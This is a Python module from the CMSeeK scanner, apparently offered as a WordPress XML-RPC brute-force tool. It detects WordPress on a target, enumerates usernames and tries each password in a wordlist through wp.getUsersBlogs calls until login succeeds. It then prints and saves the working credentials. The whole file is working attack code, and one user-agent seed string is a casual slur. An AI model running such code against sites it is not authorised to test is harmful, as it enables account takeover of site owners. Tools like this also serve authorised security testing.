#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CMSeeK, check the LICENSE file for more information
# Copyright (c) 2018 - 2020 Tuhinshubhra
### WordPress XML-RPC Bruteforce module
### Version 1.0
### cmseekbruteforcemodule <- make sure you include this comment in any custom modules you create so that cmseek can recognize it as a part of it's module

import cmseekdb.basic as cmseek
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import deepscans.wp.userenum as wp_user_enum
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import cmseekdb.generator as generator
import requests

def wpbrutexmlrpc(xmlrpcurl, user, password):
    postdata = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>'.format(user, password)
    brute = requests.post(xmlrpcurl, data=postdata)
    try:
        if "isAdmin" in brute.text and "blogid" in brute.text:
            return True
        else:
            return False
    except:
        return False


def start():
    cmseek.clearscreen()
    cmseek.banner("WordPress XML-RPC Bruteforce Module")
    url = cmseek.targetinp("") # input('Enter Url: ')
    cmseek.info("Checking for WordPress")
    bsrc = cmseek.getsource(url, cmseek.randomua('thiscanbeanythingasfarasnowletitbewhatilovethemost'))
    if bsrc[0] != '1':
        # print(bsrc[1])
        cmseek.error("Could not get target source, CMSeek is quitting")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'wp':
            wpcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'wp':
                wpcnf = '1'
            else:
                wpcnf = '0'
    if wpcnf != '1':
        print(bsrc[1])
        cmseek.error('Could not confirm WordPress... CMSeek is quitting')
        cmseek.handle_quit()
    else:
        cmseek.success("WordPress Confirmed... validating xmlrpc interface")
        xmlrpcurl = url + '/xmlrpc.php'
        wploginsrc = cmseek.getsource(xmlrpcurl, cmseek.randomua('thatsprettygay'))
        if wploginsrc[1] == 'HTTP Error 405: Method Not Allowed':
            cmseek.success("Login form found.. Detecting Username For Bruteforce")
            wpparamuser = []
            uenum = wp_user_enum.start('wp', url, cmseek.randomua('r'), '0', bsrc[1])
            usernamesgen = uenum[0]
            wpparamuser = uenum[1]

            if wpparamuser == []:
                customuser = input("[~] CMSeek could not enumerate usernames, enter username if you know any: ")
                if customuser == "":
                    cmseek.error("No user found, CMSeek is quitting")
                else:
                    wpparamuser.append(customuser)
            wpbruteusers = set(wpparamuser)

            for user in wpbruteusers:
                passfound = '0'
                print('\n')
                cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                pwd_file = open("wordlist/passwords.txt", "r")
                passwords = pwd_file.read().split('\n')
                passwords.insert(0, user)
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Testing Password: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        cursrc = wpbrutexmlrpc(xmlrpcurl, user, password)
                        if cursrc:
                            cmseek.success('Password found!')
                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                            cmseek.success('Enjoy The Hunt!')
                            cmseek.savebrute(url,url + '/wp-login.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        cmseek.error('\n\nCould Not find Password!')
                print('\n\n')

        else:
            cmseek.error("Couldn't find XML-RPC interface... CMSeeK is quitting")
            # print(wploginsrc[1])
            cmseek.handle_quit()
